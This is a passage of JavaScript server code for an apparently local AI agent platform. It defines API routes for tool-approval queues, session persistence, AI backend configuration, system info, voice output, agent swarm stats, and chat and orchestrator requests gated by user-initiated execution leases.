          return sendJson(res, 200, { ok: true, resumed: missionId, reply: chunks.join('') });
        } catch (e) { return sendJson(res, 500, { error: e.message }); }
      }
    }

    // ========== REMOTE APPROVALS (S13 — universal approval surface) ==========
    // Any first-class surface (CLI/TUI/Web/Desktop/Mobile) can list, inspect,
    // approve or deny queued approvals. ToolRuntime contexts with
    // remoteApprovals: true block on this queue instead of instant-denying.
    if (pathname.startsWith('/api/approvals')) {
      try {
        const REMOTE = require('./lib/remote-approvals');
        const parts = pathname.split('/'); // ['', 'api', 'approvals', ...]
        if (pathname === '/api/approvals/pending' && method === 'GET') {
          return sendJson(res, 200, { ok: true, pending: REMOTE.pending() });
        }
        if (pathname === '/api/approvals' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.tool) return sendJson(res, 400, { error: 'tool required' });
          const q = REMOTE.queue({ tool: body.tool, args: body.args || {}, context: body.context, ttlSeconds: body.ttlSeconds });
          return sendJson(res, 200, { ok: true, ...q });
        }
        const requestId = parts[3];
        if (requestId && parts[4] === 'approve' && method === 'POST') {
          const body = await parseBody(req);
          const r = REMOTE.approve(requestId, { notes: body && body.notes });
          if (!r) return sendJson(res, 404, { error: 'approval request not found' });
          broadcast({ type: 'approval.resolved', requestId, decision: 'approved', timestamp: new Date().toISOString() });
          // P1 supervision chain: log the operator's approve decision to
          // the steer ledger so verified-helpful computation has lineage.
          try {
            require('./lib/steer-ledger').recordSteer({
              requestId, tool: r.tool, decision: 'approved',
              reason: body && body.notes || null, ts: new Date().toISOString(),
            });
          } catch (_) { /* ledger not writable — never fail the approval */ }
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (requestId && parts[4] === 'deny' && method === 'POST') {
          const body = await parseBody(req);
          const r = REMOTE.deny(requestId, { reason: body && body.reason });
          if (!r) return sendJson(res, 404, { error: 'approval request not found' });
          broadcast({ type: 'approval.resolved', requestId, decision: 'denied', timestamp: new Date().toISOString() });
          try {
            require('./lib/steer-ledger').recordSteer({
              requestId, tool: r.tool, decision: 'denied',
              reason: body && body.reason || null, ts: new Date().toISOString(),
            });
          } catch (_) { /* ledger not writable — never fail the approval */ }
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (requestId && parts.length === 4 && method === 'GET') {
          const r = REMOTE.get(requestId);
          if (!r) return sendJson(res, 404, { error: 'approval request not found' });
          return sendJson(res, 200, { ok: true, request: r });
        }
        return sendJson(res, 404, { error: 'unknown approvals route' });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== SESSION PERSISTENCE (S12 — portable sessions) ==========
    // Suspend/resume/fork/list durable checkpoints so a session can move
    // between surfaces (parity invariant 6/7) and survive restarts.
    if (pathname.startsWith('/api/session/persist')) {
      try {
        const SP = require('./lib/session-persistence');
        const parts = pathname.split('/'); // ['', 'api', 'session', 'persist', ...]
        if (parts[4] === 'suspend' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.sessionId) return sendJson(res, 400, { error: 'sessionId required' });
          const r = SP.suspend(body.sessionId, { messages: body.messages || [], context: body.context || {} });
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (parts[4] === 'resume' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.sessionId) return sendJson(res, 400, { error: 'sessionId required' });
          try {
            const r = SP.resume(body.sessionId);
            return sendJson(res, 200, { ok: true, ...r });
          } catch (e) { return sendJson(res, 404, { error: e.message }); }
        }
        if (parts[4] === 'fork' && method === 'POST') {
          const body = await parseBody(req);
          if (!body || !body.sessionId) return sendJson(res, 400, { error: 'sessionId required' });
          const r = SP.fork(body.sessionId);
          return sendJson(res, 200, { ok: true, ...r });
        }
        if (parts[4] === 'list' && method === 'GET') {
          return sendJson(res, 200, { ok: true, sessions: SP.list() });
        }
        return sendJson(res, 404, { error: 'unknown session persistence route' });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== AI BACKEND MANAGEMENT ==========
    if (pathname === '/api/backends' && method === 'GET') {
      const backends = state.settings.aiBackends || [];
      return sendJson(res, 200, { 
        backends: backends.map(publicBackend),
        active: state.settings.activeBackend,
        count: backends.length 
      });
    }

    if (pathname === '/api/backends' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { backend } = body;
        if (!backend || !backend.id) return sendJson(res, 400, { error: 'Backend with id required' });
        
        const backends = state.settings.aiBackends || [];
        const existingIdx = backends.findIndex(b => b.id === backend.id);
        
        if (existingIdx >= 0) {
          backends[existingIdx] = { ...backends[existingIdx], ...backend };
        } else {
          backends.push({
            id: backend.id,
            name: backend.name || backend.id,
            provider: backend.provider || 'custom',
            apiKey: backend.apiKey || '',
            endpoint: backend.endpoint || '',
            model: backend.model || 'gpt-4o',
            contextWindow: backend.contextWindow || 32000,
            supportsStreaming: backend.supportsStreaming ?? true,
            supportsFunctionCalling: backend.supportsFunctionCalling ?? true,
            enabled: backend.enabled ?? true
          });
        }
        
        state.settings.aiBackends = backends;
        saveSettings();
        return sendJson(res, 200, { ok: true, backends: backends.map(publicBackend) });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname.startsWith('/api/backends/') && method === 'DELETE') {
      const backendId = pathname.split('/')[3];
      if (!backendId) return sendJson(res, 400, { error: 'Backend id required' });
      
      const backends = state.settings.aiBackends || [];
      const filtered = backends.filter(b => b.id !== backendId);
      
      if (filtered.length === backends.length) return sendJson(res, 404, { error: 'Backend not found' });
      
      state.settings.aiBackends = filtered;
      if (state.settings.activeBackend === backendId) {
        state.settings.activeBackend = filtered[0]?.id || 'kimi';
      }
      saveSettings();
      return sendJson(res, 200, { ok: true, activeBackend: state.settings.activeBackend });
    }

    if (pathname === '/api/backends/switch' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { backendId } = body;
        if (!backendId) return sendJson(res, 400, { error: 'backendId required' });
        
        const backends = state.settings.aiBackends || [];
        const backend = backends.find(b => b.id === backendId);
        if (!backend) return sendJson(res, 404, { error: 'Backend not found' });
        if (!backend.enabled) return sendJson(res, 400, { error: 'Backend not enabled' });
        
        state.settings.activeBackend = backendId;
        saveSettings();
        
        // Update Kimi client if switching to kimi
        if (backendId === 'kimi' && backend.apiKey && kimiClient) {
          // Reinitialize Kimi client with new key
          kimiClient.apiKey = backend.apiKey;
        }
        
        return sendJson(res, 200, { ok: true, activeBackend: backendId, backend: publicBackend(backend) });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/backends/test' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { backendId } = body;
        
        const backends = state.settings.aiBackends || [];
        const backend = backendId ? backends.find(b => b.id === backendId) : backends.find(b => b.id === state.settings.activeBackend);
        if (!backend) return sendJson(res, 404, { error: 'Backend not found' });
        if (!backend.endpoint) return sendJson(res, 400, { error: 'No endpoint configured' });
        
        // Simple connectivity test - just check if endpoint responds
        const testPayload = JSON.stringify({
          model: backend.model,
          messages: [{ role: 'user', content: 'test' }],
          max_tokens: 5
        });
        
        const url = new URL(backend.endpoint);
        const options = {
          hostname: url.hostname,
          port: url.port || (url.protocol === 'https:' ? 443 : 80),
          path: url.pathname,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${backend.apiKey || ''}`
          }
        };
        
        const protocol = url.protocol === 'https:' ? https : http;
        const testReq = protocol.request(options, (testRes) => {
          let data = '';
          testRes.on('data', c => data += c);
          testRes.on('end', () => {
            if (testRes.statusCode && testRes.statusCode < 300) {
              return sendJson(res, 200, { ok: true, backend: backend.id, status: 'connected', latency: 0 });
            } else {
              return sendJson(res, 200, { ok: false, backend: backend.id, status: 'error', error: `HTTP ${testRes.statusCode}` });
            }
          });
        });
        testReq.on('error', (e) => sendJson(res, 200, { ok: false, backend: backend.id, status: 'error', error: e.message }));
        testReq.setTimeout(5000, () => { testReq.destroy(); sendJson(res, 200, { ok: false, backend: backend.id, status: 'timeout' }); });
        testReq.write(testPayload);
        testReq.end();
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ========== END AI BACKEND MANAGEMENT ==========

    if (pathname === '/api/processes' && method === 'GET') {
      const out = execSync('tasklist /FO CSV /NH', { encoding: 'utf8', windowsHide: true });
      const lines = out.trim().split('\n').slice(0, 50);
      const procs = lines.map(l => { const parts = l.split('","'); return { pid: parseInt(parts[1]), name: parts[0].replace('"', '') }; }).filter(p => !isNaN(p.pid));
      return sendJson(res, 200, procs);
    }

    if (pathname === '/api/disk' && method === 'GET') {
      try { const out = execSync('powershell -Command "Get-PSDrive -PSProvider FileSystem | Select-Object Name,Used,Free | ConvertTo-Json"', { encoding: 'utf8', windowsHide: true, timeout: 5000 }); return sendText(res, 200, out); }
      catch (e) { return sendJson(res, 200, { error: e.message }); }
    }

    if (pathname === '/api/network' && method === 'GET') {
      const out = execSync('ipconfig /all', { encoding: 'utf8', windowsHide: true, maxBuffer: 1024 * 1024 });
      return sendText(res, 200, out);
    }

    if (pathname === '/api/system' && method === 'GET') return sendJson(res, 200, { platform: os.platform(), arch: os.arch(), cpus: os.cpus(), totalmem: os.totalmem(), freemem: os.freemem(), loadavg: os.loadavg(), uptime: os.uptime(), hostname: os.hostname() });

    if (pathname === '/api/security/scan/full' && method === 'POST') return proxyToGuardian(req, res, '/scan/full', 'POST');
    if (pathname === '/api/security/scan/secrets' && method === 'POST') return proxyToGuardian(req, res, '/scan/secrets', 'POST');
    if (pathname === '/api/security/scan/dependencies' && method === 'POST') return proxyToGuardian(req, res, '/scan/dependencies', 'POST');
    if (pathname === '/api/security/scan/emergency' && method === 'POST') return proxyToGuardian(req, res, '/scan/emergency', 'POST');
    if (pathname === '/api/security/status' && method === 'GET') return proxyToGuardian(req, res, '/status', 'GET');
    if (pathname === '/api/security/recommendations' && method === 'GET') return proxyToGuardian(req, res, '/recommendations', 'GET');
    if (pathname === '/api/security/voice/start' && method === 'POST') return proxyToGuardian(req, res, '/voice/start', 'POST');
    if (pathname === '/api/security/voice/stop' && method === 'POST') return proxyToGuardian(req, res, '/voice/stop', 'POST');
    if (pathname === '/api/security/info' && method === 'GET') return sendJson(res, 200, { service: 'GUARDIAN Security', port: 7784, endpoints: [{ method: 'POST', path: '/api/security/scan/full', description: 'Run full security scan' }, { method: 'POST', path: '/api/security/scan/secrets', description: 'Scan for hardcoded secrets' }, { method: 'POST', path: '/api/security/scan/dependencies', description: 'Audit dependencies' }, { method: 'POST', path: '/api/security/scan/emergency', description: 'Emergency security scan' }, { method: 'GET', path: '/api/security/status', description: 'Get security status' }, { method: 'GET', path: '/api/security/recommendations', description: 'Get security recommendations' }, { method: 'POST', path: '/api/security/voice/start', description: 'Start voice security handler' }, { method: 'POST', path: '/api/security/voice/stop', description: 'Stop voice security handler' }], voiceCommands: ['scan security', 'check secrets', 'audit dependencies', 'validate inputs', 'emergency', 'security status'] });

    if (pathname === '/api/voice/speak' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { text, mood } = body;
        if (!text) return sendJson(res, 400, { error: 'text required' });
        // REAL-TTS-AUDIO LAW: x-voice-format:audio synthesizes via local
        // Kokoro (services/voice/mimi_speak.py) and returns audio/wav bytes
        // so the CLIENT plays + analyses it — the SPEAKING visualizer reacts
        // to actual spoken output. Legacy bridge path stays for compat.
        if ((req.headers['x-voice-format'] || '') === 'audio') {
          const os = require('os');
          const pathMod = require('path');
          const outPath = pathMod.join(os.tmpdir(), `purpclaw-tts-${Date.now()}.wav`);
          execFile('python', [pathMod.join(__dirname, 'services', 'voice', 'mimi_speak.py'),
            String(text).slice(0, 600), outPath], { timeout: 45000 }, (err) => {
            if (err || !fs.existsSync(outPath)) {
              try { fs.unlinkSync(outPath); } catch {}
              return sendJson(res, 503, { error: 'tts synthesis failed', detail: err && err.message });
            }
            const buf = fs.readFileSync(outPath);
            try { fs.unlinkSync(outPath); } catch {}
            res.writeHead(200, { 'content-type': 'audio/wav', 'content-length': buf.length, 'cache-control': 'no-store' });
            res.end(buf);
          });
          return;
        }
        sendToBridge({ type: 'tts_request', text, mood: mood || 'chill' });
        broadcast({ type: 'tts_speak', text, mood, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true, text });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/voice/stop' && method === 'POST') { sendToBridge({ type: 'tts_stop' }); broadcast({ type: 'tts_stopped', timestamp: new Date().toISOString() }); return sendJson(res, 200, { ok: true }); }

    if (pathname === '/api/mood' && method === 'GET') return sendJson(res, 200, { mood: state.currentMood || 'chill', previousMood: state.previousMood || 'chill', timestamp: new Date().toISOString() });

    if (pathname === '/api/mood' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const { mood } = body;
        const validMoods = ['hype', 'focused', 'chill', 'chaotic', 'sad', 'angry', 'excited', 'sleeping'];
        if (!mood || !validMoods.includes(mood)) return sendJson(res, 400, { error: 'Invalid mood', validMoods });
        sendToBridge({ type: 'mood_change', mood });
        broadcast({ type: 'mood_changed', mood, timestamp: new Date().toISOString() });
        return sendJson(res, 200, { ok: true, mood });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    if (pathname === '/api/agents/registry' && method === 'GET') {
      const registry = loadAgentRoster();
      let roles = [];
      try { roles = require('./lib/agent-role-resolver').listRoles(); } catch {}
      return sendJson(res, 200, { agents: registry, roles, count: registry.length });
    }

    // ── DYNAMIC COUNCIL (lib/council-vote-engine.js) ──
    if (pathname === '/api/council' && method === 'GET') {
      try {
        const engine = require('./lib/council-vote-engine');
        const data = engine.loadVotes();
        return sendJson(res, 200, {
          votes: (data.votes || []).slice(-50).map(v => engine.describeVote(v)),
          leaderboard: engine.leaderboard(10),
        });
      } catch (e) { return sendJson(res, 500, { error: e.message }); }
    }

    // ── BUDDY (Tamagotchi) — canonical state from lib/mochi-state.js; UI renders, core owns truth ──
    if (pathname === '/api/buddy' && method === 'GET') {
      try {
        const mochi = require('./lib/mochi-state');
        const core = require('./lib/mochi');
        const state = mochi.readMochi() || mochi.hatchMochi();
        core.applyNeeds(state);   // DECAY-ON-READ LAW: GET always serves current needs, never stale stored ones
        return sendJson(res, 200, { ok: true, buddy: state });
      } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
    }
    if (pathname === '/api/buddy' && method === 'POST') {
      try {
        const body = await parseBody(req);
        const mochi = require('./lib/mochi-state');
        // SINGLE-WRITER LAW: care effects live ONLY in lib/mochi.js
        // careAction/applyNeeds — this handler delegates, never reimplements.
        const core = require('./lib/mochi');
        const CARE_MAP = { feed: 'feed', play: 'play', sleep: 'rest', clean: 'rest', pet: null };
        if (!Object.prototype.hasOwnProperty.call(CARE_MAP, body.action)) {
          return sendJson(res, 400, { ok: false, error: 'unknown action', allowed: Object.keys(CARE_MAP) });
        }
        const state = mochi.readMochi() || mochi.hatchMochi();
        state.interactions = (state.interactions || 0) + 1;
        state['last' + body.action[0].toUpperCase() + body.action.slice(1) + 'At'] = new Date().toISOString();
        core.applyNeeds(state);                       // decay before the action lands
        const mapped = CARE_MAP[body.action];
        if (mapped && !core.careAction(state, mapped)) {
          return sendJson(res, 400, { ok: false, error: 'unknown action', allowed: Object.keys(CARE_MAP) });
        }
        if (body.action === 'pet') state.bond = Math.min(100, (state.bond ?? 50) + 2);
        state.mood = core.deriveMood(state);           // mood always derived, never fabricated
        mochi.saveMochi(state);
        return sendJson(res, 200, { ok: true, buddy: state });
      } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
    }

    // ── SLASH BINDING REGISTRY (single source of truth for the composer) ──
    if (pathname === '/api/registry/commands' && method === 'GET') {
      return sendJson(res, 200, slashRegistry.commands());
    }
    if (pathname === '/api/registry/agents' && method === 'GET') {
      return sendJson(res, 200, { agents: slashRegistry.agents(), count: 0 });
    }
    if (pathname === '/api/registry/skills' && method === 'GET') {
      return sendJson(res, 200, { skills: slashRegistry.skills() });
    }
    if (pathname === '/api/registry/tools' && method === 'GET') {
      return sendJson(res, 200, slashRegistry.tools());
    }
    if (pathname === '/api/registry/instructions' && method === 'GET') {
      return sendJson(res, 200, { instructions: slashRegistry.instructions() });
    }

    if (pathname === '/api/stats' && method === 'GET') {
      const divisionStats = {};
      let totalActive = 0, totalAgents = 0;
      const allDivisions = ['AI Research', 'Media Ops', 'Security', 'Data Mining', 'Engineering', 'Design', 'Management', 'Infrastructure', 'Lobby'];
      for (const division of allDivisions) {
        const divAgents = Object.values(state.swarmAgents).filter(a => a.division === division);
        const workingAgents = divAgents.filter(a => a.status === 'working');
        const info = { count: divAgents.length, active: workingAgents.length, priority: 3 };
        divisionStats[division] = info;
        totalAgents += info.count || 0;
        totalActive += info.active || 0;
      }
      return sendJson(res, 200, { system: { uptime: process.uptime(), memory: process.memoryUsage(), cpu: os.loadavg(), platform: os.platform() }, swarm: { totalAgents, totalActive, totalDivisions: 9, divisions: divisionStats }, logs: { total: state.logs.length, byType: state.logs.reduce((acc, log) => { acc[log.type] = (acc[log.type] || 0) + 1; return acc; }, {}) }, responses: { total: state.responses.length }, timestamp: new Date().toISOString() });
    }

    if (pathname === '/api/pipeline' && method === 'GET') {
      const registry = loadAgentRoster();
      const swarm = Object.entries(state.swarmAgents).map(([id, a]) => {
        const procInfo = state.activeProcesses[a.pid];
        let cpu = 0, memory = 0;
        if (procInfo && procInfo.process) {
          try { cpu = procInfo.process.cpuUsage ? procInfo.process.cpuUsage().user / 1000000 : 0; memory = procInfo.process.memoryUsage ? procInfo.process.memoryUsage().heapUsed : 0; } catch (e) {}
        }
        return { id: a.id, name: a.name || null, division: a.division, status: a.status, currentTask: a.currentTask, pid: a.pid, startTime: a.startTime, cpu: Math.round(cpu * 100) / 100, memory: Math.round(memory / 1024 / 1024 * 100) / 100 };
      });
      const allDivisions = ['AI Research', 'Media Ops', 'Security', 'Data Mining', 'Engineering', 'Design', 'Management', 'Infrastructure', 'Lobby'];
      const divisions = allDivisions.map(divName => {
        const divAgents = swarm.filter(a => a.division === divName);
        const working = divAgents.filter(a => a.status === 'working');
        const totalCpu = divAgents.reduce((s, a) => s + a.cpu, 0);
        const totalMem = divAgents.reduce((s, a) => s + a.memory, 0);
        return { name: divName, agentCount: divAgents.length, activeAgents: working.length, cpuUsage: Math.round(totalCpu * 100) / 100, memoryUsage: Math.round(totalMem * 100) / 100, agents: divAgents.map(a => ({ id: a.id, name: a.name, status: a.status, currentTask: a.currentTask })) };
      });
      const totalSpawned = Object.keys(state.swarmAgents).length;
      const stats = { totalAgents: swarm.length, activeNow: swarm.filter(a => a.status === 'working').length, totalCpu: Math.round(swarm.reduce((s, a) => s + a.cpu, 0) * 100) / 100, totalMemory: Math.round(swarm.reduce((s, a) => s + a.memory, 0) * 100) / 100, systemUptime: process.uptime(), systemMemory: process.memoryUsage().heapUsed, systemCpu: os.loadavg() };
      return sendJson(res, 200, { registry: { agents: registry, count: registry.length }, swarm: { agents: swarm, count: swarm.length }, divisions: { list: divisions, count: divisions.length }, stats, sammyStatus: state.sammyStatus, sammyCurrentTask: state.sammyCurrentTask, bridgeConnected: bridgeWs && !bridgeWs.destroyed, timestamp: new Date().toISOString() });
    }

    if (pathname === '/api/tower/status' && method === 'GET') {
      const status = AgentTower.getAgentStatus();
      return sendJson(res, 200, status);
    }

    if (pathname === '/api/tower/divisions' && method === 'GET') {
      const divisionsWithCounts = {};
      for (const [key, info] of Object.entries(AgentTower.divisions || {})) {
        divisionsWithCounts[key] = { ...info, agentCount: info.agents?.length || 0 };
      }
      return sendJson(res, 200, divisionsWithCounts);
    }

    if (pathname === '/api/tower/agents' && method === 'GET') {
      const status = AgentTower.getAgentStatus();
      return sendJson(res, 200, status.registeredAgents);
    }

    // ── /api/composer/context — Active Context Panel data ────────────────
    // Powers the "what will be sent" panel above the textbox. Returns
    // per-item preview, real token count, the prompt that will be built,
    // and any warnings (size, secrets). Real file reads, no fakery.
    if (pathname === '/api/composer/context' && method === 'POST') {
      return composerContextHandler(req, res);
    }

    // ── /api/cognitive/events — live event feed (SSE) ─────────────────
    // Streams state.logs as they arrive. Backed by the existing
    // state.logs buffer (max 1000 entries, ring-buffer). The cognitive
    // panel subscribes and shows what's happening right now.
    if (pathname === '/api/cognitive/events' && method === 'GET') {
      sseStart(res);
      // First, send the recent backlog (last 50 entries) so the client
      // has something to render immediately.
      const backlog = state.logs.slice(0, 50).reverse();
      for (const ev of backlog) {
        sseEvent(res, 'event', { kind: 'history', log: ev });
      }
      sseEvent(res, 'phase', { phase: 'live', total: state.logs.length });
      // Subscribe to new logs
      const onLog = (log) => sseEvent(res, 'event', { kind: 'live', log });
      const interval = setInterval(() => sseComment(res, 'keepalive'), 15000);
      logSubscribers.add(onLog);
      req.on('close', () => {
        clearInterval(interval);
        logSubscribers.delete(onLog);
        try { res.end(); } catch {}
      });
      return;
    }

    if (pathname === '/api/tower/teams' && method === 'GET') {
      const status = AgentTower.getAgentStatus();
      return sendJson(res, 200, status.teams);
    }

    if (pathname === '/api/chat/swarm' && method === 'POST') {
      // Swarm mode — fan out to N agents in parallel, stream each one's tokens
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handleChatSwarm(req, res);
      }
      // Non-streaming JSON: just call and wait
      try {
        const body = await parseBody(req);
        const { message, agents } = body;
        if (!message) return sendJson(res, 400, { ok: false, error: 'message required' });
        const llm = require('./lib/llm-provider');
        const defaultAgents = [
          { id: "planner", role: "Planner", system: "You are the PurpClaw Planner. Produce a concise 3-7 step plan for the user's goal. Be specific, not generic. Max 200 words." },
          { id: "researcher", role: "Researcher", system: "You are the PurpClaw Researcher. Surface 3-5 key facts, prior art, and best practices for the user's goal. Be concrete, not theoretical. Max 200 words." },
          { id: "builder", role: "Builder", system: "You are the PurpClaw Builder. Identify which files/functions to touch and what the diff would look like. Be specific with file paths. Max 200 words." },
        ];
        const agentList = Array.isArray(agents) && agents.length ? agents : defaultAgents;
        const results = await Promise.allSettled(agentList.map(async (a) => {
          const r = await llm.chat([
            { role: 'system', content: a.system },
            { role: 'user', content: message },
          ], { temperature: 0.4, maxTokens: 600 });
          return { id: a.id, role: a.role, ok: true, content: r.content, model: r.model };
        }));
        const succeeded = results.filter(r => r.status === 'fulfilled' && r.value.ok).map(r => r.value);
        return sendJson(res, 200, { ok: succeeded.length > 0, agents: succeeded, total: agentList.length });
      } catch (e) { return sendJson(res, 500, { ok: false, error: e.message }); }
    }

    // ── ORCHESTRATOR API (spec §14) ─────────────────────────────────────
    // Every POST requires an explicit user-gesture execution lease with a
    // matching orchestrator action. Plain chat mentioning workflows/goals
    // stays CHAT — intent classification is telemetry only.
    const ORCH_ACTIONS = new Set(['RUN_WORKFLOW', 'RESUME_WORKFLOW', 'START_GOAL', 'RESUME_GOAL', 'CANCEL_GOAL']);
    if (pathname.startsWith('/api/orchestrator/')) {
      const runtime = require('./lib/orchestrator/runtime');
      const orch = runtime.getOrchestrator();
      try {
        if (method === 'GET' && pathname === '/api/orchestrator/runs') {
          return sendJson(res, 200, { ok: true, runs: orch.listWorkflowRuns(50) });
        }
        if (method === 'GET' && pathname === '/api/orchestrator/goals') {
          return sendJson(res, 200, { ok: true, goals: orch.listGoals(50) });
        }
        if (method !== 'POST') return sendJson(res, 405, { error: 'method not allowed' });

        const body = await parseBody(req);
        // Lease arrives in the body, minted by the cockpit/slash gesture layer
        // (authorizeExecution). Never auto-created here.
        const lease = body.effectiveLease || null;
        const action = body.action || null;
        if (!lease || !ORCH_ACTIONS.has(action)) {
          return sendJson(res, 403, { ok: false, code: 'EXECUTION_NOT_USER_INITIATED',
            error: 'orchestrator actions require an explicit SLASH_COMMAND/UI_ACTION lease with an orchestrator action' });
        }
        runtime.registerLease(lease);
        const gatedLease = Object.assign({}, lease, { id: lease.executionId || null, action });

        if (pathname === '/api/orchestrator/workflow/run') {
          const wf = (typeof body.workflow === 'object' && body.workflow) || null;
          if (!wf) return sendJson(res, 400, { error: 'workflow definition required' });
          const result = await orch.runWorkflow(wf, gatedLease);
          return sendJson(res, 200, { ok: true, ...result });
        }
        if (pathname === '/api/orchestrator/workflow/resume') {
          const wf = (typeof body.workflow === 'object' && body.workflow) || null;
          if (!wf || !body.runId) return sendJson(res, 400, { error: 'workflow + runId required' });
          const result = await orch.resumeWorkflow(wf, body.runId, body.humanInput || {}, gatedLease);
          return sendJson(res, 200, { ok: true, ...result });
        }
        if (pathname === '/api/orchestrator/goal/start') {
          if (!body.goal) return sendJson(res, 400, { error: 'goal text required' });
          const result = await orch.startGoal(body.goal, gatedLease, {
            constraints: body.constraints || [], budget: body.budget || undefined,
          });
          return sendJson(res, 200, { ok: true, ...result });
        }
        if (pathname === '/api/orchestrator/goal/cancel') {
          if (!body.goalId) return sendJson(res, 400, { error: 'goalId required' });
          const rec = await orch.cancelGoal(body.goalId, gatedLease);
          return sendJson(res, 200, { ok: true, status: rec.status });
        }
        return sendJson(res, 404, { error: 'unknown orchestrator route' });
      } catch (e) {
        const code = e.code || 'ORCH_ERROR';
        return sendJson(res, code.startsWith('EXECUTION_') ? 403 : 500, { ok: false, code, error: e.message });
      }
    }

    if (pathname === '/api/chat' && method === 'POST') {
      // SSE streaming mode — when client requests text/event-stream, stream
      // tokens as they arrive. Otherwise fall through to the JSON path.
      if ((req.headers['accept'] || '').includes('text/event-stream')) {
        return handleChatStream(req, res);
      }
      try {
        const body = await parseBody(req);
        const { message, spawnAgents = true } = body;
        if (!message) return sendJson(res, 400, { error: 'message required' });

        // SLASH-ONLY EXECUTION LAW (HTTP surface) — a message starting with '/'
        // dispatches through the same SLASH_COMMANDS table the CLI uses. No slash
        // means no command execution: plain CHAT never reaches this branch.
        if (typeof message === 'string' && message.startsWith('/')) {
          const ASK_CMDS = require('./lib/commands/ask.js');
          const table = ASK_CMDS.SLASH_COMMANDS || ASK_CMDS.default?.SLASH_COMMANDS || ASK_CMDS;
          const spaceIdx = message.indexOf(' ');
          const rawName2 = spaceIdx === -1 ? message : message.slice(0, spaceIdx);
          // SLASH LAW: case-insensitive command lookup (see SSE path).
          const lookupName2 = rawName2.toLowerCase();
          const cmd = table[lookupName2] || table[rawName2];
          const cmdName = cmd ? (table[rawName2] ? rawName2 : lookupName2) : rawName2;
          const cmdArgs = spaceIdx === -1 ? '' : message.slice(spaceIdx + 1);
          if (cmd && typeof cmd.run === 'function') {
            // async slash handlers (orchestrator) must be awaited — never String(Promise)
            try {
              const out = await cmd.run(cmdArgs, {
                model: process.env.LLM_MODEL || null,
                provider: process.env.LLM_PROVIDER || null,
              });
              return sendJson(res, 200, { ok: true, slash: cmdName, reply: String(out) });
            } catch (err) {
              return sendJson(res, 200, { ok: false, slash: cmdName, reply: `slash failed: ${err.message}`, code: err.code || null });
            }
          }
          // Unknown slash — refuse execution, list what exists.
          return sendJson(res, 200, { ok: false, slash: cmdName, reply: `unknown command: ${cmdName}`, available: Object.keys(table) });
        }
        // Same conversation memory as the SSE path — both are /api/chat, so a
        // surface must not lose context by choosing the non-streaming variant.
        const chatSessionId = body.session_id || body.sessionId || `surface:${body.source || 'chat'}`;
        const chatHistory = getChatHistory(chatSessionId);

        // EXECUTION LEASE — Gate 1: authorize before any routing.
        // WORK MODE LAW (mirror of SSE gate): selector flip to WORK is the
        // operator gesture — mint/refresh the persistent session, upgrade the
        // envelope access rung unless the client sent an explicit one.
        const _nsOpMode = body.operatorMode === 'WORK' ? 'WORK'
          : body.operatorMode === 'CHAT' ? 'CHAT' : null;
        if (_nsOpMode === 'WORK') {
          EXEC.mintWorkSession({ sessionId: chatSessionId, source: 'UI_ACTION' });
          if (!body.envelope || !body.envelope.access) {
            body.envelope = Object.assign({}, body.envelope || {}, { access: 'agent-actions' });
          }
        } else if (_nsOpMode === 'CHAT') {
          EXEC.revokeWorkSession();
        }
        const chatExecutionLease = EXEC.authorizeExecution({
          message,
          executionIntent: body.executionIntent,
          executionAction: body.executionAction,
          sessionId: chatSessionId,
          operatorMode: _nsOpMode || undefined,
        });
        // WORK_SESSION persistence (mirror of SSE turnAuthority): when no
        // per-turn lease won but the session is minted, it carries authority.
        // LEASE-CONTAINMENT LAW: a cross-session grant (authorized=false) does
        // NOT confer authority here — that was the audit's "lease=null yet
        // tool ran" leak surface.
        const _wsRec = EXEC.getWorkSession(chatSessionId);
        const nsEffectiveLease = chatExecutionLease || ((_wsRec && _wsRec.authorized) ? {
          executionId: 'work_' + chatSessionId,
          sessionId: chatSessionId,
          initiatedBy: 'user',
          source: 'WORK_SESSION',
          action: body.executionAction || 'RUN',
          authorized: true,
          revoked: false,
        } : null);

        const semantic = await SEMANTIC_CHAT.execute({
          message,
          envelope: body.envelope || {},
          sessionId: chatSessionId,
          source: body.source || 'chat',
          operatorConfirmed: body.operatorConfirmed === true,
          context: { cwd: body.cwd || process.cwd(), workspaceRoot: PURP_DIR },
        });
        if (semantic.handled) {
          // GATE LAW (nonstream mirror of SSE :1192): deterministic execution
          // is real capability execution. No lease → refuse, stay CHAT, offer
          // modes. Without this, lease=null intent=EXECUTE tools run here.
          if (!nsEffectiveLease) {
            const _cap = semantic.resolution && semantic.resolution.matched && semantic.resolution.matched.capability || null;
            const refused = 'That request needs execution, but no execution lease was created (plain chat mode). Use a slash command or an explicit Execute gesture.';
            safeLog('GATE1', `[nonstream-deterministic-refused] capability=${_cap} msg="${String(message).slice(0, 40)}"`);
            appendChatTurn(chatSessionId, 'user', message, body.source || 'chat');
            appendChatTurn(chatSessionId, 'assistant', refused, body.source || 'chat');
            return sendJson(res, 200, {
              ok: true,
              reply: refused,
              model: null,
              provider: null,
              providerStatus: 'execution-not-user-initiated',
              tool_calls: [],
              sessionId: chatSessionId,
              modeOffer: { kind: 'EXECUTION_INTENT_NO_LEASE', capability: _cap, offers: ['RUN_ONCE', 'SWITCH_TO_WORK'] },
              historyTurns: getChatHistory(chatSessionId).length,
            });
          }
